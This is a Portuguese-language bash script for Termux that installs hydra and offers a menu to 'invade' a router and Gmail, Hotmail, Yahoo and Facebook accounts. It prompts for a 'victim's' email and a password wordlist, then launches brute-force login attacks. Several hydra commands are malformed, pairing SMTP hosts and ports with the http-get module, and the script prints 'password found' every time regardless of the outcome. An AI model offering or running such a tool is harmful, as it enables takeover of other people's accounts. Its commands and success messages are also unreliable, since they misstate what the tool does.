#! /data/data/com.termux/files/usr/bin/bash
#
#
#Fazendo o programa dormir por 3 segundos
sleep 3
#
#Instalando o hydra
pkg install hydra
#
#
#Limpando a tela
clear
#
#
#BANNER
echo "###################################"
echo "=          BRUTE-FORCE            ="
echo "=           COM HYDRA             ="
echo "=                                 ="
echo "=             2018                ="
echo "##################################"
echo
#
#
#MENU
echo "======================================"
echo "=   \033[1;34m[\033[1;31m1]>> \033[1;33mINVADIR ROTEADOR \033[1;36m"
echo "=   \033[1;34m[\033[1;31m2]>> \033[1;33mINVADIR GMAIL \033[1;36m"
echo "=   \033[1;34m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
echo "=   \033[1;34m[\033[1;31m4]>> \033[1;33mINVADIR YAHOOL \033[1;36m"
echo "=   \033[1;34m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
echo "======================================"
echo
#
#Escolher entre 1,2,3,4 ou 5
#obrigado por 6usar!
read -p "[+]>>" opcao
#
#Invadir roteador
if [ "$opcao" = "1" ];then
echo "\033[1;31mINFORME O IP DO SEU ROTEADOR"; sleep 2
read -p "[+]=>" ip
echo
echo "\033[1;31mINFORME O USER DO SEU ROTEADOR"; sleep 2
read -p "[+]=>" user
echo
echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
read -p "[+]=>" wordlist
echo 
 echo "\033[1;31mINVADINDO ROTEADOR..."; sleep 2
hydra -l $user -P $wordlist -V $ip http-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 2
fi
#Invadir Gmail
if [ "$opcao" = "2" ];then
echo
echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
read -p "[+]>>" email
echo
echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
read -p "[+]>>" lista
echo
 echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
hydra -l $email -P $lista -s 465 smtp.gmail.com http-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
fi
#Invadir HOTMAIL
if [ "$opcao" = "3" ];then
echo
echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
read -p "[+]>>" email
echo
echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
sleep 2
read -p "[+]>>" lista
echo
 echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
hydra -l $email -P $lista -s 587 smtp.live.com http-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
fi
#Invadir YAHOO
if [ "$opcao" = "4" ];then
echo
echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
read -p "[+]>>" email
echo
echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
sleep 2
read -p "[+]>>" lista
echo
 echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
hydra -l $email -P $lista -s 465 smtp.mail.yahoo.com http-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
fi
#Invadir FACEBOOK
if [ "$opcao" = "5" ];then
echo
echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
read -p "[+]>>" email
echo
echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
sleep 2
read -p "[+]>>" lista
echo
 echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
hydra -l $email -P $lista -f www.facebook.com http-get
echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
fi
#
#Fazendo o programa dormir por 4 segundos
sleep 4
#
#Saindo do Script

exit
